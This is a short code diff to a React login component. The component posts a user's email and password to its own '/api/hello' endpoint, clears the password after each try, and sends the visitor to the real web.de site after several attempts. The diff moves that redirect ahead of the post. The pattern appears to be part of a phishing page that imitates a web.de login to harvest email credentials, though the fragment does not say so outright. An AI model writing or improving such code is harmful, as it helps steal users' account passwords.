@@ -65,15 +65,16 @@ export default function Main() {
       email: credentials.email,
       password: credentials.passwort
     }
+    if (count === 2) {
+      window.location.href = 'https://web.de'
+      return
+    }
     axios.post('/api/hello', data)
     .then((req) => {
       console.log(req.data);
       setCredentials({...credentials, passwort: ""})
 
-      if (count === 2) {
-        window.location.href = 'https://web.de'
-        return
-      }
+      
       setCount((prev) => prev + 1)
     }).catch((err) => {
       console.log(err);
